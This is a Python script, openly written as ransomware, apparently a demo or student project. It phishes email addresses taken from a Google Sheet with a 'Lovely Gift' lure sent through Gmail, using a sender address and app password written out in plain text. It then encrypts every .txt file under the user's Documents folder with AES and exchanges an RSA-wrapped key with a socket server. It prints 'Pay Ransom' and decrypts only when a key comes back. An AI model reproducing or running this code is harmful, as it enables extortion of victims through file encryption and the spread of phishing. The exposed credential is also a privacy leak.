#!/usr/bin/env python3.10
import csv
import requests
import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import socket
import os
import random
import string
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode

SERVER_IP = SERVER_IP = socket.gethostbyname(socket.gethostname())
SERVER_PORT = 5678

def main():
    print("Infection Started")
    infect()
    print("Infection Finished")
    with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        publicKeyData = s.recv(1024)
        lockFiles()
        print("Files Encrypted")
        publicKey = RSA.import_key(publicKeyData)
        with open("Key.key","r") as f:
            aesKey = f.read()
        encKey = encryptRSA(publicKey, aesKey)
        with open("encryptedKey.key", "w") as f:
            f.write(b64encode(encKey).decode())
        s.send(b'Public key sent successfully')

    print("Pay Ransom")
    ransom = input()

    with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
        s.connect((SERVER_IP, SERVER_PORT))
        s.send(b64encode(encKey))
        decKey = s.recv(1024)
        print("Decrypted key received")
        unlockFiles(decKey)
        print("Files Decrypted")
        time.sleep(10)

def encryptAES(plaintext):
    f = open("Key.key","r")
    aesKey = f.read()
    cipher = AES.new(aesKey.encode(), AES.MODE_ECB)
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return ciphertext

def decryptAES(decryptionKey, ciphertext):
    cipher = AES.new(decryptionKey, AES.MODE_ECB)
    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return plaintext

def encryptRSA(publicKey, plaintext):
    cipher = PKCS1_OAEP.new(publicKey)
    ciphertext = cipher.encrypt(plaintext.encode())
    return ciphertext

# def lockFiles():
#     print("Encryption in Progress")
#     documents_folder = os.path.expanduser("~\\Documents")
#     for file in os.listdir(documents_folder):
#         if file.endswith(".txt"):
#             with open(documents_folder + file, "r") as f:
#                 content = f.read()
#             content = encryptAES(content)
#             with open(documents_folder + file, "w") as f:
#                 f.write(b64encode(content).decode())

# def lockFiles():
#     print("Encryption in Progress")
#     documents_folder = os.path.expanduser("~\\Documents")
#     for file in os.listdir(documents_folder):
#         if file.endswith(".txt"):
#             file_path = os.path.join(documents_folder, file)
#             with open(file_path, "r") as f:
#                 content = f.read()
#             # Perform encryption on the content (using encryptAES() function)
#             encrypted_content = encryptAES(content)
#             encoded_content = b64encode(encrypted_content).decode()
#             with open(file_path, "w") as f:
#                 f.write(encoded_content)


def lockFiles():
    print("Encryption in Progress")
    documents_folder = os.path.expanduser("~\\Documents")
    for root, dirs, files in os.walk(documents_folder):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                with open(file_path, "r") as f:
                    content = f.read()
                # Perform encryption on the content (using encryptAES() function)
                encrypted_content = encryptAES(content)
                encoded_content = b64encode(encrypted_content).decode()
                with open(file_path, "w") as f:
                    f.write(encoded_content)


# def unlockFiles(decryptionKey):
#     documents_folder = os.path.expanduser("~\\Documents")
#     for file in os.listdir(documents_folder):
#         if file.endswith(".txt"):
#             with open(documents_folder + file, "r") as f:
#                 content = f.read()
#                 content = b64decode(content.encode())
#                 content = decryptAES(decryptionKey, content)
#             with open(documents_folder + file,"w") as f:
#                 f.write(content.decode())

# def unlockFiles(decryptionKey):
#     documents_folder = os.path.expanduser("~\\Documents")
#     for file in os.listdir(documents_folder):
#         if file.endswith(".txt"):
#             file_path = os.path.join(documents_folder, file)
#             with open(file_path, "r") as f:
#                 content = f.read()
#                 encoded_content = b64decode(content.encode())
#                 decrypted_content = decryptAES(decryptionKey, encoded_content)
#             with open(file_path, "w") as f:
#                 f.write(decrypted_content.decode())

def unlockFiles(decryptionKey):
    documents_folder = os.path.expanduser("~\\Documents")
    for root, dirs, files in os.walk(documents_folder):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                with open(file_path, "r") as f:
                    content = f.read()
                    encoded_content = b64decode(content.encode())
                    decrypted_content = decryptAES(decryptionKey, encoded_content)
                with open(file_path, "w") as f:
                    f.write(decrypted_content.decode())

def genKey():
    key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    f = open("Key.key","w")
    f.write(key)
    f.close()
    return key

def extract_emails_from_csv(csv_data):
    emails = []
    reader = csv.DictReader(csv_data.splitlines())
    headers = reader.fieldnames  # Get the column headers

    if 'Email' in headers:  # Check if 'Email' column exists
        for row in reader:
            emails.append(row['Email'])  # Extract email from 'Email' column

    return emails

def send_email_with_drive_attachment(sender_email, sender_password, receiver_email, subject, body, drive_link):
    # Setup the email message
    message = MIMEMultipart()
    message['From'] = sender_email
    message['To'] = receiver_email
    message['Subject'] = subject

    # Create a link to the Google Drive file
    drive_url = f'<a href="{drive_link}">Click here to access the file</a>'

    # Create the HTML content of the email body
    html = f'<p>{body}</p><p>{drive_url}</p>'
    message.attach(MIMEText(html, 'html'))

    # Send the email
    with smtplib.SMTP('smtp.gmail.com', 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(message)

def infect():
    csv_url = 'https://docs.google.com/spreadsheets/d/1Wcb2hzqL56QorxwBFW96QWSuyYv_x9VwiFH1nMqJCHA/gviz/tq?tqx=out:csv'
    drive_link = 'https://drive.google.com/your-drive-link'  # Replace with your Google Drive file link
    sender_email = 'ziadearth@gmail.com'  # Update with your email address
    sender_password = 'anurgtliuivwtgle'  # Update with your email password
    subject = 'Congrats you received a Lovely Gift'
    body = 'You are the winner of our beautiful, not suspicious at all software. Please download it from the following link:'

    # Download the CSV data from the Google Sheets link
    response = requests.get(csv_url)
    if response.status_code == 200:
        csv_data = response.text

        # Extract emails from the CSV data
        emails = extract_emails_from_csv(csv_data)

        # Send the Google Drive attachment to each email
        for email in emails:
            send_email_with_drive_attachment(sender_email, sender_password, email, subject, body, drive_link)
            print(f"Sent email to: {email}")
    else:
        print("Failed to download the CSV data")



if __name__ == "__main__":
    key = genKey()
    main()
